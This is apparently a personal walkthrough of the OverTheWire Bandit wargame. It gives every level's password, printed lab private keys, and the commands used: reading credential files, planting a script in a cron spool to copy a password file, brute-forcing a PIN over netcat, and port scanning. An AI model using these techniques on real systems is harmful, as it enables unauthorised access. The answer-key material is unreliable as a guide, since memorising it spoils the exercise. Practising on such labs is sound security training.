username	-	password
========================================
bandit0		-	bandit0

----------------------------------------
bandit1		-	boJ9jbbUNNfktd78OOpsqOltutMc3MY1

bandit1@melinda:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
----------------------------------------
bandit2		-	CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

bandit2@melinda:~$ cat spaces\ in\ this\ filename 
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
----------------------------------------
bandit3		-	UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

bandit3@melinda:~$ cat inhere/.hidden 
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
----------------------------------------
bandit4		-	pIwrPrtPN36QITSp3EQaw936yaFoFgAB

bandit4@melinda:~$ find inhere/ -type f -exec file {} \;
inhere/-file08: data
inhere/-file05: data
inhere/-file07: ASCII text
inhere/-file04: data
inhere/-file00: data
inhere/-file01: data
inhere/-file06: data
inhere/-file03: data
inhere/-file09: data
inhere/-file02: data
bandit4@melinda:~$ cat inhere/-file07 
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
----------------------------------------
bandit5		-	koReBOKuIDDepwhWk7jZC0RTdopnAYKh

bandit5@melinda:~$ find inhere/ -size 1033c -exec cat {} \;
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
----------------------------------------
bandit6		-	DXjZPULLxYr17uwoI01bNLQbtFemEgo7

bandit6@melinda:~$ find / -user bandit7 -group bandit6 -size 33c -exec cat {} \; 2>/dev/null
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
----------------------------------------
bandit7		-	HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

bandit7@melinda:~$ grep millionth data.txt 
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
----------------------------------------
bandit8		-	cvX2JJa4CFALtqS87jk27qwqGhBM9plV

bandit8@melinda:~$ sort data.txt |uniq -c|sort -nr|tail -1
      1 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
----------------------------------------
bandit9		-	UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

bandit9@melinda:~$ strings data.txt |egrep '^=+'
========== password
========== ism
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
----------------------------------------
bandit10	-	truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

bandit10@melinda:~$ base64 -d data.txt 
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
----------------------------------------
bandit11	-	IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

bandit11@melinda:~$ cat data.txt|tr a-zA-Z n-za-mN-ZA-M
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
----------------------------------------
bandit12	-	5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

bandit12@melinda:~$ mkdir /tmp/pero
bandit12@melinda:~$ xxd -r data.txt > /tmp/pero/data.gz
bandit12@melinda:~$ file /tmp/pero/data.gz 
/tmp/pero/data.gz: gzip compressed data, was "data2.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
bandit12@melinda:~$ mv /tmp/pero/data.gz /tmp/pero/data2.bin.gz
bandit12@melinda:~$ gunzip /tmp/pero/data2.bin.gz                                                                                            
bandit12@melinda:~$ file /tmp/pero/data2.bin                                                                                                 
/tmp/pero/data2.bin: bzip2 compressed data, block size = 900k
bandit12@melinda:~$ bunzip2 /tmp/pero/data2.bin
bunzip2: Can't guess original name for /tmp/pero/data2.bin -- using /tmp/pero/data2.bin.out
bandit12@melinda:~$ file /tmp/pero/data2.bin.out
/tmp/pero/data2.bin.out: gzip compressed data, was "data4.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
bandit12@melinda:~$ mv /tmp/pero/data2.bin /tmp/pero/data2.bin.gz                                                                                                                              
bandit12@melinda:~$ gunzip /tmp/pero/data2.bin.gz
bandit12@melinda:~$ file /tmp/pero/data2.bin
/tmp/pero/data2.bin: POSIX tar archive (GNU)
bandit12@melinda:~$ tar tvf /tmp/pero/data2.bin                                                                                                                                                
-rw-r--r-- root/root     10240 2014-11-14 10:32 data5.bin
bandit12@melinda:~$ tar xf /tmp/pero/data2.bin -C /tmp/pero
bandit12@melinda:~$ file /tmp/pero/data5.bin
/tmp/pero/data5.bin: POSIX tar archive (GNU)
bandit12@melinda:~$ tar tf /tmp/pero/data5.bin                                                                                                                                                 
data6.bin
bandit12@melinda:~$ tar xf /tmp/pero/data5.bin -C /tmp/pero                                                                                                                                    
bandit12@melinda:~$ file /tmp/pero/data6.bin 
/tmp/pero/data6.bin: bzip2 compressed data, block size = 900k
bandit12@melinda:~$ bunzip2 /tmp/pero/data6.bin                                                                                                                                                
bunzip2: Can't guess original name for /tmp/pero/data6.bin -- using /tmp/pero/data6.bin.out
bandit12@melinda:~$ file /tmp/pero/data6.bin.out
/tmp/pero/data6.bin.out: POSIX tar archive (GNU)
bandit12@melinda:~$ tar tf /tmp/pero/data6.bin.out
data8.bin
bandit12@melinda:~$ tar xf /tmp/pero/data6.bin.out -C /tmp/pero                                                                                                                                
bandit12@melinda:~$ file /tmp/pero/data8.bin
/tmp/pero/data8.bin: gzip compressed data, was "data9.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
bandit12@melinda:~$ mv /tmp/pero/data8.bin /tmp/pero/data9.bin.gz 
bandit12@melinda:~$ gunzip /tmp/pero/data9.bin.gz
bandit12@melinda:~$ file /tmp/pero/data9.bin                                                                                                                                                   
/tmp/pero/data9.bin: ASCII text
bandit12@melinda:~$ cat /tmp/pero/data9.bin                                                                                                                                                    
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
----------------------------------------
bandit13	-	8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

bandit13@melinda:~$ cat sshkey.private 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
-----END RSA PRIVATE KEY-----

bandit13@melinda:~$ ssh -i sshkey.private bandit14@localhost                                                                                                                
Could not create directory '/home/bandit13/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is 05:3a:1c:25:35:0a:ed:2f:cd:87:1c:f6:fe:69:e4:f6.
Are you sure you want to continue connecting (yes/no)? yes
...
bandit14@melinda:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
----------------------------------------
bandit14	-	4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e

bandit14@melinda:~$ echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e|nc localhost 30000
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
----------------------------------------
bandit15	-	BfMYroe26WYalil77FoDi9qh59eK5xNr

bandit15@melinda:~$ echo BfMYroe26WYalil77FoDi9qh59eK5xNr|openssl s_client -connect localhost:30001 -quiet
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

read:errno=0
----------------------------------------
bandit16	-	cluFn7wTiGryunymYOu4RcffSxQluehd

bandit16@melinda:~$ nmap localhost -p31000-32000|awk -F\/ '/tcp open/{system("echo "$1"; echo cluFn7wTiGryunymYOu4RcffSxQluehd|nc localhost "$1)}'
31046
cluFn7wTiGryunymYOu4RcffSxQluehd
31518
ERROR
140737354045088:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:350:
31691
cluFn7wTiGryunymYOu4RcffSxQluehd
31790
ERROR
140737354045088:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:350:
31960
cluFn7wTiGryunymYOu4RcffSxQluehd

bandit16@melinda:~$ echo cluFn7wTiGryunymYOu4RcffSxQluehd|openssl s_client -quiet -connect localhost:31790                                                                    
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

read:errno=0
----------------------------------------
bandit17	-	private key ^ (bandit17.key)

bandit17@melinda:~$ diff passwords.new passwords.old 
42c42
< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
---
> BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR
----------------------------------------
bandit18	-	kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd

pja@red0:~/tmp/bandit$ ssh bandit18@bandit.labs.overthewire.org /bin/bash --norc
bandit18@bandit.labs.overthewire.org's password: 
ls -al
total 24
drwxr-xr-x   2 root     root     4096 Nov 14  2014 .
drwxr-xr-x 167 root     root     4096 Jul  9  2015 ..
-rw-r--r--   1 root     root      220 Apr  9  2014 .bash_logout
-rw-r-----   1 bandit19 bandit18 3660 Nov 14  2014 .bashrc
-rw-r--r--   1 root     root      675 Apr  9  2014 .profile
-rw-r-----   1 bandit19 bandit18   33 Nov 14  2014 readme
cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
----------------------------------------
bandit19	-	IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

bandit19@melinda:~$ ./bandit20-do id                  
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11020(bandit20),11019(bandit19)
bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20 
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
----------------------------------------
bandit20	-	GbKksEFF4yrVs6il55v6gwY5aVje5f0j

TERMINAL #1:
bandit20@melinda:~$ nc -4 -l -n -p 12345
GbKksEFF4yrVs6il55v6gwY5aVje5f0j  <- c/p and send
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

TERMINAL #2:
bandit20@melinda:~$ ./suconnect 12345
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
----------------------------------------
bandit21	-	gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@melinda:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
----------------------------------------
bandit22	-	Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

bandit22@melinda:/etc/cron.d$ cat cronjob_bandit23 
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@melinda:/etc/cron.d$ echo I am user bandit23|md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@melinda:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
----------------------------------------
bandit23	-	jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

bandit23@melinda:~$ cat /etc/cron.d/cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@melinda:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 "./$i"
        rm -f "./$i"
    fi
done

bandit23@melinda:~$ echo 'mkdir /tmp/b24; cat /etc/bandit_pass/bandit24 >/tmp/b24/pass' >/var/spool
/bandit24/b24                                                                                      
bandit23@melinda:~$ chmod 755 /var/spool/bandit24/b24 
ls: cannot access /tmp/b24: No such file or directory
bandit23@melinda:~$ ls -al /tmp/b24
ls: cannot access /tmp/b24: No such file or directory
bandit23@melinda:~$ ls -al /tmp/b24
total 7868
drwxrwxr-x 2 bandit24 bandit24    4096 Jun 20 07:08 .
drwxrwx-wt 1 root     root     8036352 Jun 20 07:08 ..
-rw-rw-r-- 1 bandit24 bandit24      33 Jun 20 07:08 pass
bandit23@melinda:~$ cat /tmp/b24/pass                                                              
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
----------------------------------------
bandit24	-	UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

bandit24@melinda:~$ for i in {0000..9999}; do R=`echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"|nc localhost 30002`; if [[ ! $R =~ Wrong ]]; then echo $i; echo $R; break; fi; done
5669
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Exiting.
----------------------------------------
bandit25	-	uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

bandit25@melinda:~$ ls -al
total 32
drwxr-xr-x   2 root     root     4096 Nov 16  2014 .
drwxr-xr-x 167 root     root     4096 Jul  9  2015 ..
-rw-r-----   1 bandit25 bandit25   33 Nov 16  2014 .bandit24.password
-rw-r--r--   1 root     root      220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root     root     3637 Apr  9  2014 .bashrc
-rw-r-----   1 bandit25 bandit25    4 Nov 16  2014 .pin
-rw-r--r--   1 root     root      675 Apr  9  2014 .profile
-r--------   1 bandit25 bandit25 1679 Nov 16  2014 bandit26.sshkey
bandit25@melinda:~$ ssh -i bandit26.sshkey bandit26@localhost

bandit25@melinda:~$ stty rows 3 (or simply resize your xterm)
bandit25@melinda:~$ ssh -t -i ./bandit26.sshkey bandit26@localhost

  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
--More--(33%)

* PRESS v to enter vi *

Resize the terminal back and edit files at will as user bandit26 ;)

----------------------------------------
bandit26	-	5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
